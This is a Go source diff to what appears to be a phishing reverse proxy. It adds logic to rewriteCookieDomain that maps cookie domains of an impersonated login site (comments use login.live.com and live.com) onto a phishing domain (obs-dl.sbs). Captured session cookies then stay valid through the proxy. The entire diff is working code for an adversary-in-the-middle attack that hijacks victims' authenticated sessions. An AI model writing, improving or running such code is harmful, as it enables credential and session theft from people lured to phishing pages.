@@ -2977,15 +2977,68 @@ func (m *ProxyHandler) rewriteCookieDomain(ck *http.Cookie, config map[string]se
 		cDomain = "." + cDomain
 	}
 
-	if phishHost := m.replaceHostWithPhished(strings.TrimPrefix(cDomain, "."), config); phishHost != "" {
-		if strings.HasPrefix(cDomain, ".") {
+	cleanDomain := strings.TrimPrefix(cDomain, ".")
+	hasDot := strings.HasPrefix(cDomain, ".")
+
+	if phishHost := m.replaceHostWithPhished(cleanDomain, config); phishHost != "" {
+		if hasDot {
 			ck.Domain = "." + phishHost
 		} else {
 			ck.Domain = phishHost
 		}
-	} else {
-		ck.Domain = cDomain
+		return
 	}
+
+	// Parent domain inference: if cookie domain is a parent of a config key,
+	// derive the phish parent domain. For example:
+	// Cookie Domain=live.com, config has login.live.com -> live.obs-dl.sbs
+	// live.com is a parent of login.live.com, so derive phish parent from live.obs-dl.sbs
+	// by stripping the same subdomain prefix: live.obs-dl.sbs has prefix "live" relative to
+	// obs-dl.sbs, but login.live.com has prefix "login" relative to live.com.
+	// The phish parent is the base phish domain (obs-dl.sbs).
+	for originalHost, hostConfig := range config {
+		if hostConfig.To == "" {
+			continue
+		}
+		// Check if the cookie domain is a parent/suffix of the original host
+		// e.g., cleanDomain="live.com", originalHost="login.live.com"
+		if strings.HasSuffix(strings.ToLower(originalHost), "."+strings.ToLower(cleanDomain)) {
+			// Found: originalHost is a subdomain of the cookie domain
+			// The phish equivalent: strip the subdomain prefix from the phish host
+			// originalHost = "login.live.com", cleanDomain = "live.com"
+			// prefix on original side = "login"
+			// phishHost = "live.obs-dl.sbs"
+			// We need to find what the phish equivalent of "live.com" is.
+			// Since login.live.com -> live.obs-dl.sbs, and login.live.com = login + live.com,
+			// the phish domain for live.com should be derived by stripping the same
+			// relative prefix from the phish host.
+			originalPrefix := strings.TrimSuffix(strings.ToLower(originalHost), "."+strings.ToLower(cleanDomain))
+			phishHost := hostConfig.To
+			// Try to strip the original prefix from the phish host
+			if strings.HasPrefix(strings.ToLower(phishHost), strings.ToLower(originalPrefix)+".") {
+				phishParent := phishHost[len(originalPrefix)+1:]
+				if hasDot {
+					ck.Domain = "." + phishParent
+				} else {
+					ck.Domain = phishParent
+				}
+				return
+			}
+			// Fallback: use the phish host's base domain (strip first subdomain)
+			phishParts := strings.SplitN(phishHost, ".", 2)
+			if len(phishParts) == 2 {
+				if hasDot {
+					ck.Domain = "." + phishParts[1]
+				} else {
+					ck.Domain = phishParts[1]
+				}
+				return
+			}
+		}
+	}
+
+	// No match found, keep original domain
+	ck.Domain = cDomain
 }
 
 func (m *ProxyHandler) sameSiteToString(sameSite http.SameSite) string {
